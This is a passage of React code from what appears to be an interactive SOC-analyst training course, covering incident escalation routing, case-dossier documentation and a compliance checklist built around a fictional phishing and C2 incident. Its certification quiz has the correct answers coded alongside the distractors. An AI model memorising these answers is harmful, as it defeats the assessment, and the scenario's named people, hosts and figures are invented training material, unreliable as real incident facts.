                    {[
                      { id: 1, name: 'Tier 2 Incident Response', lead: 'Priya Sharma', icon: Shield, tag: 'Host Isolation & Remediation' },
                      { id: 2, name: 'Tier 3 Threat Hunter', lead: 'Aditya Deshmukh', icon: Search, tag: 'Enterprise Sweep & Reverse Eng' },
                      { id: 3, name: 'Specialist Teams', lead: 'Network & Identity', icon: Users, tag: 'ACLs & Domain Credential Reset' },
                      { id: 4, name: 'Crisis Management', lead: 'Elena Gomez & CISO', icon: Building2, tag: 'Regulatory & Breach Disclosure' },
                    ].map((pw) => {
                      const Icon = pw.icon;
                      const isSelected = u6SelectedPathway === pw.id;
                      const isReviewed = u6PathwaysReviewed.includes(pw.id);
                      return (
                        <button
                          key={pw.id}
                          onClick={() => {
                            setU6SelectedPathway(pw.id);
                            if (!u6PathwaysReviewed.includes(pw.id)) {
                              setU6PathwaysReviewed((prev) => [...prev, pw.id]);
                            }
                          }}
                          className={`p-3 rounded-xl border text-left transition-all cursor-pointer ${
                            isSelected
                              ? 'bg-primary text-primary-foreground border-primary shadow-xs'
                              : isReviewed
                              ? 'bg-primary/5 text-primary border-primary/30 hover:bg-muted'
                              : 'bg-card hover:bg-muted border-border text-muted-foreground'
                          }`}
                        >
                          <div className="flex items-center justify-between">
                            <Icon className="w-4 h-4" />
                            {isReviewed && <Check className="w-3 h-3 text-emerald-500" />}
                          </div>
                          <span className="font-bold text-xs block mt-2">{pw.name}</span>
                          <span className="text-[10px] block opacity-80 mt-0.5">{pw.lead}</span>
                          <Badge variant="outline" className="text-[9px] mt-2 font-mono">{pw.tag}</Badge>
                        </button>
                      );
                    })}
                  </div>

                  {/* Active Pathway Details */}
                  {(() => {
                    const pathwayData = [
                      {
                        title: 'Tier 2 Incident Response (Priya Sharma)',
                        jurisdiction: 'Host-level containment, volatile memory dumping, malware removal, and root-cause eradication.',
                        whenToRoute: 'Confirmed or suspected active compromise on an internal machine (e.g. malware running, reverse shell, keylogger DLL).',
                        whatToSend: 'Hostname, IP address, process PID/PPID, extracted hash, and initial evidence timeline.',
                        commonMistake: 'Escalating an alert where malware was already automatically deleted/quarantined by EDR with zero persistence.',
                      },
                      {
                        title: 'Tier 3 Threat Hunting & Malware Reverse Engineering (Aditya Deshmukh)',
                        jurisdiction: 'Adversary attribution, custom YARA/Sigma signature creation, enterprise-wide IOC sweep, and binary reverse engineering.',
                        whenToRoute: 'Attacker campaign targeting multiple users (e.g. 47 phishing emails), zero-day exploits, or novel persistence mechanisms.',
                        whatToSend: 'Raw binary sample/dropper, decoded command-line strings, C2 domains/IPs, and list of all known recipient mailboxes.',
                        commonMistake: 'Sending single-user password lockout tickets to Tier 3.',
                      },
                      {
                        title: 'Infrastructure & Specialized Engineering Teams',
                        jurisdiction: 'Firewall engineers, Active Directory admins, Database administrators, and Messaging/Exchange gateway teams.',
                        whenToRoute: 'Actions that require administrative changes outside the SOC’s direct consoles (e.g. perimeter BGP route block, Domain Admin account reset, mail flow rule).',
                        whatToSend: 'Target IP/domain for perimeter block, username and SID for credential rotation, and formal authorization ticket.',
                        commonMistake: 'Expecting network engineers to investigate an alert for you; they need exact, actionable technical instructions.',
                      },
                      {
                        title: 'Executive Management & Crisis Command (Elena Gomez & CISO)',
                        jurisdiction: 'Strategic containment decisions, regulatory reporting (SEC 4-day, GDPR 72-hour), law enforcement coordination (FBI/CISA), and press relations.',
                        whenToRoute: 'Domain Controller compromise, active ransomware across multiple servers, or verified exfiltration of customer PII/banking tokens.',
                        whatToSend: 'Executive summary briefing in plain business English, confirmed impact, and containment status.',
                        commonMistake: 'Hiding or delaying escalation out of fear of causing alarm. In a critical breach, every minute counts.',
                      },
                    ][u6SelectedPathway - 1];

                    return (
                      <div className="p-4 rounded-xl border bg-muted/20 space-y-2.5 text-xs animate-fade-in">
                        <div className="flex items-center justify-between border-b pb-2">
                          <h5 className="font-bold text-foreground text-sm">{pathwayData.title}</h5>
                          <Badge className="bg-primary text-primary-foreground font-mono text-[10px]">Tier Jurisdiction</Badge>
                        </div>
                        <p className="text-muted-foreground"><strong className="text-foreground">Scope of Authority:</strong> {pathwayData.jurisdiction}</p>
                        <p className="text-muted-foreground"><strong className="text-foreground">When to Escalate:</strong> {pathwayData.whenToRoute}</p>
                        <p className="text-muted-foreground"><strong className="text-foreground">Mandatory Handoff Packet:</strong> {pathwayData.whatToSend}</p>
                        <div className="p-2.5 rounded-lg bg-rose-50 border border-rose-300 text-rose-950 dark:bg-rose-950/30 dark:border-rose-800 dark:text-rose-200 text-[11px]">
                          <strong>Common L1 Mistake to Avoid:</strong> {pathwayData.commonMistake}
                        </div>
                      </div>
                    );
                  })()}
                </div>

                {/* Advance Bar */}
                <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-3 pt-3 border-t">
                  {!isU6Ch1Complete && !isChapterDone('unit-6', 1) && !freeNavigationEnabled ? (
                    <span className="text-amber-600 dark:text-amber-400 text-xs font-semibold flex items-center gap-1.5">
                      <Lock className="w-3.5 h-3.5" />
                      Review at least 2 pathways above ({u6PathwaysReviewed.length}/2) to unlock Chapter 6.2
                    </span>
                  ) : <div />}
                  <Button
                    disabled={!isU6Ch1Complete && !isChapterDone('unit-6', 1) && !freeNavigationEnabled}
                    onClick={() => {
                      markChapterDone('unit-6', 1);
                      setActiveSubStep(2);
                      onCompleteTopic('topic-6-1', 35);
                      onSelectTopic('topic-6-2');
                      window.scrollTo({ top: 0, behavior: 'smooth' });
                    }}
                    className="font-bold text-xs gap-1.5 bg-primary text-primary-foreground cursor-pointer disabled:opacity-50 disabled:cursor-not-allowed"
                  >
                    <span>Advance to Chapter 6.2: Specialist Routing Board</span>
                    <ChevronRight className="w-4 h-4" />
                  </Button>
                </div>
              </CardContent>
            </Card>
          )}

          {/* CHAPTER 6.2: SPECIALIST ROUTING BOARD */}
          {activeSubStep === 2 && (
            <Card className="shadow-xs border-border animate-fade-in">
              <CardHeader className="pb-3 border-b bg-muted/20 flex flex-col sm:flex-row sm:items-center justify-between gap-3">
                <div>
                  <CardTitle className="text-base font-bold text-foreground flex items-center gap-2">
                    <Users className="w-4 h-4 text-primary" />
                    Chapter 6.2: Operational Escalation &amp; Specialist Routing Board
                  </CardTitle>
                  <p className="text-xs text-muted-foreground mt-0.5">
                    Route 5 investigated incidents to the proper specialist team based on threat scope and operational jurisdiction.
                  </p>
                </div>
                <Button
                  variant="outline"
                  size="sm"
                  onClick={() => setU6EscalationAnswers({})}
                  className="text-xs gap-1 h-7"
                >
                  <RotateCcw className="w-3 h-3" />
                  Reset Board
                </Button>
              </CardHeader>

              <CardContent className="p-5 sm:p-6 space-y-6">
                {/* Interactive SOC Dashboard Lab Launcher */}
                <CourseLabLauncher
                  labId="lab-04"
                  onLabCompleted={() => {
                    markChapterDone('unit-6', 2);
                    onCompleteTopic('topic-6-2', 50);
                  }}
                />

                <div className="space-y-3 text-xs">
                  {UNIT_6_ESCALATION_SCENARIOS.map((esc) => {
                    const currentAns = u6EscalationAnswers[esc.id];
                    return (
                      <div key={esc.id} className="p-4 rounded-xl border bg-card space-y-3">
                        <div className="flex items-center justify-between">
                          <span className="font-bold text-foreground">{esc.title}</span>
                          <Badge variant="outline" className="font-mono text-[10px]">{esc.alertId}</Badge>
                        </div>
                        <p className="text-muted-foreground">{esc.summary}</p>

                        <div className="grid grid-cols-2 sm:grid-cols-5 gap-2 pt-1">
                          {[
                            'L1 Close',
                            'L2 Incident Response',
                            'L2 + L3 Campaign Hunt',
                            'L2 + Specialist',
                            'Full Management Crisis',
                          ].map((rt) => (
                            <button
                              key={rt}
                              onClick={() => setU6EscalationAnswers((prev) => ({ ...prev, [esc.id]: rt }))}
                              className={`p-2 rounded text-center text-[11px] font-bold border transition-all cursor-pointer ${
                                currentAns === rt
                                  ? rt === esc.correctRoute
                                    ? 'bg-emerald-600 text-white border-emerald-600'
                                    : 'bg-rose-600 text-white border-rose-600'
                                  : 'bg-muted/40 hover:bg-muted border-border text-foreground'
                              }`}
                            >
                              {rt}
                            </button>
                          ))}
                        </div>

                        {currentAns && (
                          <div className="p-2.5 rounded-lg bg-primary/5 border border-primary/20 text-[11px] text-foreground space-y-0.5 animate-fade-in font-sans">
                            <p><strong>Target Teams:</strong> {esc.targetTeams.join(', ')}</p>
                            <p className="text-muted-foreground">{esc.justification}</p>
                          </div>
                        )}
                      </div>
                    );
                  })}
                </div>

                {/* Advance Bar */}
                <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-3 pt-3 border-t">
                  {!isU6Ch2Complete && !isChapterDone('unit-6', 2) && !freeNavigationEnabled ? (
                    <span className="text-amber-600 dark:text-amber-400 text-xs font-semibold flex items-center gap-1.5">
                      <Lock className="w-3.5 h-3.5" />
                      Route at least 2 escalation scenarios above ({Object.keys(u6EscalationAnswers).length}/2) to unlock Chapter 6.3
                    </span>
                  ) : <div />}
                  <Button
                    disabled={!isU6Ch2Complete && !isChapterDone('unit-6', 2) && !freeNavigationEnabled}
                    onClick={() => {
                      markChapterDone('unit-6', 2);
                      setActiveSubStep(3);
                      onCompleteTopic('topic-6-2', 35);
                      onSelectTopic('unit-6-assessment');
                      window.scrollTo({ top: 0, behavior: 'smooth' });
                    }}
                    className="font-bold text-xs gap-1.5 bg-primary text-primary-foreground cursor-pointer disabled:opacity-50 disabled:cursor-not-allowed"
                  >
                    <span>Advance to Chapter 6.3: Shift Assessment</span>
                    <ChevronRight className="w-4 h-4" />
                  </Button>
                </div>
              </CardContent>
            </Card>
          )}

          {/* CHAPTER 6.3: SHIFT ASSESSMENT */}
          {activeSubStep === 3 && (
            <Card className="shadow-xs border-primary/30 animate-fade-in">
              <CardHeader className="pb-3 border-b bg-primary/5">
                <div className="flex items-center justify-between">
                  <CardTitle className="text-base font-bold text-foreground flex items-center gap-2">
                    <Award className="w-4 h-4 text-primary" />
                    Chapter 6.3: Shift Assessment — Elena Gomez APT Emergency Dispatch
                  </CardTitle>
                  <Badge variant="outline" className="text-xs text-primary bg-primary/10">Certification Test</Badge>
                </div>
                <p className="text-xs text-muted-foreground mt-0.5">
                  Coordinate multi-tier enterprise incident dispatch under crisis conditions.
                </p>
              </CardHeader>

              <CardContent className="p-5 sm:p-6 space-y-6">
                <div className="p-4 rounded-xl bg-slate-900 text-slate-100 border border-slate-800 font-mono text-xs space-y-2">
                  <span className="text-rose-400 font-bold block">CRISIS DECLARATION: MAJOR APT INTRUSION IN PROGRESS</span>
                  <p className="text-slate-300 leading-relaxed">
                    Elena declares: &ldquo;47 computers compromised across Treasury, Domain Admin account credentials stolen, and 250 GB exfiltration in progress to a Russian bulletproof server. What is your immediate coordinated response dispatch?&rdquo;
                  </p>
                </div>

                <div className="space-y-4 text-xs">
                  {/* Question 1 */}
                  <div className="p-4 rounded-xl border bg-card space-y-2">
                    <span className="font-bold text-foreground block">
                      Question 1: What is the mandatory immediate multi-tier dispatch action?
                    </span>
                    <div className="space-y-1.5">
                      {[
                        { id: 'apt-correct', text: 'L2 isolates 47 hosts & blocks C2 IP; Identity team revokes Domain Admin tokens; Elena activates incident command & alerts CEO and Legal; Aditya (L3) begins enterprise-wide hunt.' },
                        { id: 'apt-wrong', text: 'Only L1 continues looking at SIEM alerts while waiting for tomorrow morning staff meeting.' },
                        { id: 'apt-wrong2', text: 'Email the entire company asking them to shut down their laptops without telling management.' },
                      ].map((opt) => (
                        <button
                          key={opt.id}
                          onClick={() => setU6KcTierOrder({ choice: opt.id })}
                          className={`p-3 rounded-lg border text-left w-full transition-all ${
                            u6KcTierOrder.choice === opt.id
                              ? opt.id === 'apt-correct'
                                ? 'bg-emerald-50 border-emerald-500 text-emerald-950 font-bold'
                                : 'bg-rose-50 border-rose-500 text-rose-950'
                              : 'bg-card hover:bg-muted border-border'
                          }`}
                        >
                          {opt.text}
                        </button>
                      ))}
                    </div>
                  </div>

                  {/* Question 2 */}
                  <div className="p-4 rounded-xl border bg-card space-y-2">
                    <span className="font-bold text-foreground block">
                      Question 2: What 4 items must be included in your emergency briefing to Priya (L2) and Aditya (L3)?
                    </span>
                    <div className="space-y-1.5">
                      {[
                        { id: 'q2-correct', text: 'A) Full list of 47 affected hostnames, the compromised Domain Admin SID, the external C2 destination IP (198.51.100.84), and second-by-second timeline of initial ingress.' },
                        { id: 'q2-wrong', text: 'B) Just a screenshot of the alert queue without any hostnames or timestamps.' },
                        { id: 'q2-wrong2', text: 'C) The phone number of the vendor who built the firewall.' },
                      ].map((opt) => (
                        <button
                          key={opt.id}
                          onClick={() => setU6KcQ2Answer(opt.id)}
                          className={`p-2.5 rounded-lg border text-left w-full transition-all ${
                            u6KcQ2Answer === opt.id
                              ? opt.id === 'q2-correct'
                                ? 'bg-emerald-50 border-emerald-500 text-emerald-950 font-bold'
                                : 'bg-rose-50 border-rose-500 text-rose-950'
                              : 'bg-card hover:bg-muted border-border'
                          }`}
                        >
                          {opt.text}
                        </button>
                      ))}
                    </div>
                  </div>
                </div>

                {(u6KcSubmitted || (mounted && (completedUnits.has('unit-6') || completedUnits.has('unit-6-assessment')))) ? (
                  <div className="p-4 rounded-xl border border-emerald-300 bg-emerald-50/70 text-emerald-950 flex flex-col sm:flex-row items-center justify-between gap-3 animate-fade-in" suppressHydrationWarning>
                    <div>
                      <span className="font-bold text-emerald-800 block">🎉 Unit 6 Certified! (+100 XP)</span>
                      <p className="text-xs text-emerald-700">You mastered tier escalation, specialist routing, and crisis management dispatch.</p>
                    </div>
                    <Button
                      suppressHydrationWarning
                      onClick={() => onSelectTopic('topic-7-1')}
                      className="font-bold text-xs gap-1.5 bg-emerald-600 hover:bg-emerald-700 text-white shrink-0 cursor-pointer"
                    >
                      <span>Proceed to Unit 7: Documentation &amp; Capstone</span>
                      <ChevronRight className="w-4 h-4" />
                    </Button>
                  </div>
                ) : (
                  <div className="flex flex-col sm:flex-row items-center justify-between gap-3 pt-2">
                    <Button
                      variant="outline"
                      size="sm"
                      onClick={() => {
                        setU6KcTierOrder({});
                        setU6KcQ2Answer('');
                      }}
                      className="text-xs gap-1"
                    >
                      <RotateCcw className="w-3 h-3" />
                      Reset Assessment
                    </Button>
                    <Button
                      disabled={u6KcTierOrder.choice !== 'apt-correct' || u6KcQ2Answer !== 'q2-correct'}
                      onClick={() => {
                        markChapterDone('unit-6', 3);
                        setU6KcSubmitted(true);
                        handleFinishAssessment('unit-6-assessment', 100);
                      }}
                      className="font-bold text-xs gap-1.5 bg-primary text-primary-foreground cursor-pointer w-full sm:w-auto disabled:opacity-50 disabled:cursor-not-allowed"
                    >
                      <Award className="w-4 h-4" />
                      <span>Submit &amp; Certify Unit 6 (+100 XP)</span>
                      <ChevronRight className="w-4 h-4" />
                    </Button>
                  </div>
                )}
              </CardContent>
            </Card>
          )}
        </div>
      )}

      {/* ====================================================
          UNIT 7: SOC DOCUMENTATION & FINAL GRADUATION
         ==================================================== */}
      {unitId === 'unit-7' && (
        <div className="space-y-6">
          {/* Unit 7 Chapter Navigation Tabs */}
          <div className="rounded-2xl border bg-card shadow-sm overflow-hidden">
            <div className="p-2 sm:p-3 bg-card flex items-center justify-between gap-2 overflow-x-auto border-b">
              <div className="flex items-center gap-1 sm:gap-2">
                {[
                  { num: 1, label: 'Chapter 7.1: The 8-Part Case Dossier', topicId: 'topic-7-1' },
                  { num: 2, label: 'Chapter 7.2: Case Assembly & Handover Lab', topicId: 'topic-7-2' },
                  { num: 3, label: 'Chapter 7.3: Shift Defense & Graduation', topicId: 'unit-7-assessment' },
                ].map((tab) => {
                  const isDone = isChapterDone('unit-7', tab.num) || (mounted && tab.num === 3 && (completedUnits.has('unit-7') || completedUnits.has('unit-7-assessment')));
                  const locked = isChapterLocked('unit-7', tab.num);
                  const isActive = activeSubStep === tab.num;
                  return (
                    <button
                      key={tab.num}
                      type="button"
                      suppressHydrationWarning
                      onClick={() => {
                        if (locked) {
                          showToast({
                            type: 'warning',
                            title: 'Chapter Locked 🔒',
                            description: `Complete Chapter 7.${tab.num - 1} first to unlock this chapter.`,
                          });
                          return;
                        }
                        setActiveSubStep(tab.num);
                        onSelectTopic(tab.topicId);
                        window.scrollTo({ top: 0, behavior: 'smooth' });
                      }}
                      className={`px-3 py-1.5 rounded-lg text-xs font-semibold transition-all whitespace-nowrap flex items-center gap-1.5 ${
                        isActive
                          ? 'bg-primary text-primary-foreground shadow-xs font-bold'
                          : isDone
                          ? 'bg-emerald-50 text-emerald-800 hover:bg-emerald-100 border border-emerald-300 dark:bg-emerald-950/40 dark:text-emerald-300 dark:border-emerald-800'
                          : locked
                          ? 'opacity-60 cursor-not-allowed text-muted-foreground border border-border/60'
                          : 'hover:bg-muted text-muted-foreground border border-border/60'
                      }`}
                    >
                      {isDone ? (
                        <CheckCircle2 className="w-3 h-3 text-emerald-600 dark:text-emerald-400" />
                      ) : locked ? (
                        <Lock className="w-3 h-3 text-muted-foreground/60" />
                      ) : null}
                      <span>{tab.label}</span>
                    </button>
                  );
                })}
              </div>
              <div className="hidden md:flex items-center gap-2 shrink-0 text-xs text-muted-foreground font-mono">
                <span>Unit 7 — Chapter {activeSubStep} of 3</span>
              </div>
            </div>
          </div>

          {/* CHAPTER 7.1: THE 8-PART CASE DOSSIER ANATOMY */}
          {activeSubStep === 1 && (
            <Card className="shadow-xs border-border animate-fade-in">
              <CardHeader className="pb-3 border-b bg-muted/20 flex flex-col sm:flex-row sm:items-center justify-between gap-3">
                <div>
                  <CardTitle className="text-base font-bold text-foreground flex items-center gap-2">
                    <FileCheck className="w-4 h-4 text-primary" />
                    Chapter 7.1: The 8-Part Audit-Grade Case Dossier Anatomy
                  </CardTitle>
                  <p className="text-xs text-muted-foreground mt-0.5">
                    Inspect the side-by-side contrast between amateur notes and courtroom-ready documentation.
                  </p>
                </div>

                <div className="flex items-center gap-1.5 flex-wrap">
                  {UNIT_7_DOSSIER_SECTIONS.map((sec) => (
                    <button
                      key={sec.partNumber}
                      onClick={() => {
                        setU7ActiveDossierPart(sec.partNumber);
                        if (!u7DossierPartsReviewed.includes(sec.partNumber)) {
                          setU7DossierPartsReviewed((prev) => [...prev, sec.partNumber]);
                        }
                      }}
                      className={`w-7 h-7 rounded text-xs font-bold border transition-all cursor-pointer ${
                        u7ActiveDossierPart === sec.partNumber
                          ? 'bg-primary text-primary-foreground border-primary shadow-xs'
                          : u7DossierPartsReviewed.includes(sec.partNumber)
                          ? 'bg-primary/5 text-primary border-primary/30 hover:bg-muted'
                          : 'bg-card hover:bg-muted border-border text-muted-foreground'
                      }`}
                    >
                      {sec.partNumber}
                    </button>
                  ))}
                </div>
              </CardHeader>

              <CardContent className="p-5 sm:p-6 space-y-6">
                {/* Elena Gomez Quote */}
                <div className="p-4 rounded-xl border border-sky-200 bg-sky-50/50 dark:bg-sky-950/20 dark:border-sky-800 text-xs space-y-2">
                  <div className="flex items-center gap-2 font-bold text-sky-900 dark:text-sky-300">
                    <span className="w-6 h-6 rounded-full bg-sky-600 text-white flex items-center justify-center text-[10px]">EG</span>
                    <span>Elena Gomez (SOC Manager): &ldquo;If You Didn&apos;t Write It Down, It Never Happened&rdquo;</span>
                  </div>
                  <p className="text-sky-950 dark:text-sky-200 leading-relaxed">
                    &ldquo;When compliance auditors, insurance underwriters, or government regulators examine our SOC, they never watch your screen—they only read your case record. If your notes say &lsquo;looks bad, resolved it&rsquo;, FinCorp fails its audit and faces multi-million dollar regulatory fines. A courtroom-ready case record has 8 mandatory anatomy parts. Click through all 8 sections below.&rdquo;
                  </p>
                </div>

                {/* Active Section Deep Dive */}
                {(() => {
                  const sec = UNIT_7_DOSSIER_SECTIONS.find((s) => s.partNumber === u7ActiveDossierPart)!;
                  return (
                    <div className="space-y-4 animate-fade-in text-xs">
                      <div className="flex items-center justify-between border-b pb-2">
                        <span className="font-bold text-sm text-foreground">
                          Section {sec.partNumber}: {sec.sectionTitle}
                        </span>
                        <Badge className="bg-primary/10 text-primary border-primary/20">{sec.badge}</Badge>
                      </div>

                      <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
                        <div className="p-4 rounded-xl border border-rose-200 bg-rose-50/40 text-rose-950 dark:bg-rose-950/30 dark:border-rose-800 dark:text-rose-200 space-y-1.5">
                          <span className="font-bold text-rose-700 dark:text-rose-400 block uppercase tracking-wider font-mono text-[10px]">
                            ✗ Amateur / Incomplete Note (Audit Failure)
                          </span>
                          <p className="leading-relaxed font-mono text-[11px]">{sec.badExample}</p>
                        </div>

                        <div className="p-4 rounded-xl border border-emerald-200 bg-emerald-50/40 text-emerald-950 dark:bg-emerald-950/30 dark:border-emerald-800 dark:text-emerald-200 space-y-1.5">
                          <span className="font-bold text-emerald-700 dark:text-emerald-400 block uppercase tracking-wider font-mono text-[10px]">
                            ✓ Audit-Grade Documentation (Courtroom Ready)
                          </span>
                          <p className="leading-relaxed font-mono text-[11px] whitespace-pre-line">{sec.goodExample}</p>
                        </div>
                      </div>

                      <div className="p-3.5 rounded-xl bg-muted/40 border text-muted-foreground italic space-y-1">
                        <span className="font-bold text-foreground not-italic">Why Compliance Cares:</span>
                        <p>{sec.whyItMatters}</p>
                      </div>

                      <div className="flex items-center justify-between pt-2 border-t">
                        <Button
                          variant="outline"
                          size="sm"
                          disabled={u7ActiveDossierPart === 1}
                          onClick={() => {
                            const prev = Math.max(1, u7ActiveDossierPart - 1);
                            setU7ActiveDossierPart(prev);
                            if (!u7DossierPartsReviewed.includes(prev)) {
                              setU7DossierPartsReviewed((p) => [...p, prev]);
                            }
                          }}
                          className="text-xs gap-1 cursor-pointer"
                        >
                          <ChevronLeft className="w-3.5 h-3.5" />
                          Previous Section
                        </Button>
                        {u7ActiveDossierPart < 8 ? (
                          <Button
                            size="sm"
                            onClick={() => {
                              const next = u7ActiveDossierPart + 1;
                              setU7ActiveDossierPart(next);
                              if (!u7DossierPartsReviewed.includes(next)) {
                                setU7DossierPartsReviewed((p) => [...p, next]);
                              }
                            }}
                            className="text-xs gap-1 font-bold cursor-pointer bg-primary text-primary-foreground"
                          >
                            <span>Next Section (Part {u7ActiveDossierPart + 1})</span>
                            <ChevronRight className="w-3.5 h-3.5" />
                          </Button>
                        ) : (
                          <Badge className="bg-emerald-600 text-white text-[10px]">All 8 Sections Reviewed ✓</Badge>
                        )}
                      </div>
                    </div>
                  );
                })()}

                {/* Advance Bar */}
                <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-3 pt-3 border-t">
                  {!isU7Ch1Complete && !isChapterDone('unit-7', 1) && !freeNavigationEnabled ? (
                    <span className="text-amber-600 dark:text-amber-400 text-xs font-semibold flex items-center gap-1.5">
                      <Lock className="w-3.5 h-3.5" />
                      Review at least 3 dossier sections above ({u7DossierPartsReviewed.length}/3) to unlock Chapter 7.2
                    </span>
                  ) : <div />}
                  <Button
                    disabled={!isU7Ch1Complete && !isChapterDone('unit-7', 1) && !freeNavigationEnabled}
                    onClick={() => {
                      markChapterDone('unit-7', 1);
                      setActiveSubStep(2);
                      onCompleteTopic('topic-7-1', 35);
                      onSelectTopic('topic-7-2');
                      window.scrollTo({ top: 0, behavior: 'smooth' });
                    }}
                    className="font-bold text-xs gap-1.5 bg-primary text-primary-foreground cursor-pointer disabled:opacity-50 disabled:cursor-not-allowed"
                  >
                    <span>Advance to Chapter 7.2: Case Assembly Lab</span>
                    <ChevronRight className="w-4 h-4" />
                  </Button>
                </div>
              </CardContent>
            </Card>
          )}

          {/* CHAPTER 7.2: CASE ASSEMBLY & SHIFT HANDOVER LAB */}
          {activeSubStep === 2 && (
            <Card className="shadow-xs border-border animate-fade-in">
              <CardHeader className="pb-3 border-b bg-muted/20 flex flex-col sm:flex-row sm:items-center justify-between gap-3">
                <div>
                  <CardTitle className="text-base font-bold text-foreground flex items-center gap-2">
                    <FileText className="w-4 h-4 text-primary" />
                    Chapter 7.2: [Lab] Incident Case Assembly &amp; Shift Handover
                  </CardTitle>
                  <p className="text-xs text-muted-foreground mt-0.5">
                    Assemble Michael Chen&apos;s Case Record (SEC-2026-0412) and complete the Compliance Audit Checklist.
                  </p>
                </div>
                <Button
                  variant="outline"
                  size="sm"
                  onClick={() => setU7CheckedAuditItems({})}
                  className="text-xs gap-1 h-7"
                >
                  <RotateCcw className="w-3 h-3" />
                  Reset Checklist
                </Button>
              </CardHeader>

              <CardContent className="p-5 sm:p-6 space-y-6">
                <div className="p-4 rounded-xl border bg-muted/20 space-y-2 text-xs">
                  <h4 className="font-bold text-foreground font-mono">Shift Handover Ticket Preparation</h4>
                  <p className="text-muted-foreground leading-relaxed">
                    Check off all 6 required compliance standards to verify that Case #SEC-2026-0412 meets FinCorp SOC Audit Specifications before handover to Priya (L2) and the Night Shift.
                  </p>
                </div>

                {/* Compliance Checklist */}
                <div className="space-y-2.5 text-xs">
                  {[
                    { id: 1, label: 'Standard 1: Affected Entities Verified', desc: 'Identified user Michael Chen (Treasury) and hostname FIN-BOS-MCHEN-047 (10.20.5.147).' },
                    { id: 2, label: 'Standard 2: Process Genealogy Attached', desc: 'Parent process WINWORD.EXE (PID: 4812) spawning child powershell.exe (PID: 9024).' },
                    { id: 3, label: 'Standard 3: Command Obfuscation Decoded', desc: 'Decoded Base64 payload revealing web request to C2 server 198.51.100.84.' },
                    { id: 4, label: 'Standard 4: Cryptographic Hash & Threat Intel Logged', desc: 'Attachment SHA-256 verified as Emotet trojan with 58/72 VirusTotal detection score.' },
                    { id: 5, label: 'Standard 5: Containment Actions Confirmed', desc: 'Firewall dropped outbound C2 connection; EDR terminated process PID 9024.' },
                    { id: 6, label: 'Standard 6: Prioritized Next Steps Assigned', desc: 'Tasked Identity team for password reset, email gateway for domain block, and Aditya for 47-user sweep.' },
                  ].map((item) => {
                    const isChecked = !!u7CheckedAuditItems[item.id];
                    return (
                      <div
                        key={item.id}
                        onClick={() => setU7CheckedAuditItems((prev) => ({ ...prev, [item.id]: !prev[item.id] }))}
                        className={`p-3 rounded-xl border flex items-center justify-between cursor-pointer transition-all ${
                          isChecked
                            ? 'bg-emerald-50/60 border-emerald-300 text-emerald-950 dark:bg-emerald-950/30 dark:border-emerald-800 dark:text-emerald-200'
                            : 'bg-card hover:bg-muted border-border text-foreground'
                        }`}
                      >
                        <div className="flex items-start gap-2.5">
                          {isChecked ? (
                            <CheckSquare className="w-4 h-4 text-emerald-600 dark:text-emerald-400 mt-0.5 shrink-0" />
                          ) : (
                            <Square className="w-4 h-4 text-muted-foreground mt-0.5 shrink-0" />
                          )}
                          <div>
                            <span className="font-bold block">{item.label}</span>
                            <span className="text-[11px] text-muted-foreground">{item.desc}</span>
                          </div>
                        </div>
                        {isChecked && (
                          <Badge className="bg-emerald-600 text-white text-[10px] shrink-0 ml-2">Audit Verified ✓</Badge>
                        )}
                      </div>
                    );
                  })}
                </div>

                {/* Live Dossier Summary Preview */}
                <div className="p-4 rounded-xl bg-slate-950 text-slate-100 border border-slate-800 font-mono text-xs space-y-2">
                  <div className="flex items-center justify-between border-b border-slate-800 pb-2">
                    <span className="text-sky-400 font-bold">CASE DOSSIER PREVIEW: SEC-2026-0412</span>
                    <Badge className="bg-emerald-500/20 text-emerald-300 border-emerald-500/30 text-[10px]">
                      {Object.keys(u7CheckedAuditItems).length}/6 Standards Met
                    </Badge>
                  </div>
                  <p className="text-slate-300 text-[11px] leading-relaxed">
                    &ldquo;Executive Summary: Spear phishing invoice delivered to Senior Finance Analyst Michael Chen. Document triggered hidden PowerShell attempting C2 callback to 198.51.100.84. EDR terminated process; firewall blocked egress. Zero data exfiltration. Host isolated, domain blacklisted, and 47 recipients queued for proactive hunter sweep.&rdquo;
                  </p>
                </div>

                {/* Advance Bar */}
                <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-3 pt-3 border-t">
                  {!isU7Ch2Complete && !isChapterDone('unit-7', 2) && !freeNavigationEnabled ? (
                    <span className="text-amber-600 dark:text-amber-400 text-xs font-semibold flex items-center gap-1.5">
                      <Lock className="w-3.5 h-3.5" />
                      Verify at least 3 audit standards above ({Object.keys(u7CheckedAuditItems).length}/3) to unlock Chapter 7.3
                    </span>
                  ) : <div />}
                  <Button
                    disabled={!isU7Ch2Complete && !isChapterDone('unit-7', 2) && !freeNavigationEnabled}
                    onClick={() => {
                      markChapterDone('unit-7', 2);
                      setActiveSubStep(3);
                      onCompleteTopic('topic-7-2', 35);
                      onSelectTopic('unit-7-assessment');
                      window.scrollTo({ top: 0, behavior: 'smooth' });
                    }}
                    className="font-bold text-xs gap-1.5 bg-primary text-primary-foreground cursor-pointer disabled:opacity-50 disabled:cursor-not-allowed"
                  >
                    <span>Advance to Chapter 7.3: Shift Defense &amp; Graduation</span>
                    <ChevronRight className="w-4 h-4" />
                  </Button>
                </div>
              </CardContent>
            </Card>
          )}

          {/* CHAPTER 7.3: SHIFT DEFENSE & GRADUATION */}
          {activeSubStep === 3 && (
            <Card className="shadow-xs border-primary/40 bg-gradient-to-br from-primary/5 via-card to-card animate-fade-in">
              <CardHeader className="pb-3 border-b bg-primary/10 flex flex-col sm:flex-row sm:items-center justify-between gap-3">
                <div>
                  <CardTitle className="text-base font-bold text-foreground flex items-center gap-2">
                    <Award className="w-5 h-5 text-primary" />
                    Chapter 7.3: Shift Defense &amp; Junior SOC Analyst Graduation
                  </CardTitle>
                  <p className="text-xs text-muted-foreground mt-0.5">
                    Friday 16:00 PM: End of Week 2. Defend your case records before Elena Gomez, Rajesh Kumar, and Priya Sharma.
                  </p>
                </div>
                <Badge className="bg-primary text-primary-foreground font-mono">Capstone Graduation</Badge>
              </CardHeader>

              <CardContent className="p-5 sm:p-6 space-y-6">
                {/* Boardroom Setting */}
                <div className="p-4 rounded-xl bg-slate-900 text-slate-100 font-mono text-xs space-y-2 border border-slate-800">
                  <span className="text-sky-400 font-bold block">FINCORP SOC BOARDROOM INQUEST (16:00 PM)</span>
                  <p className="text-slate-300 leading-relaxed">
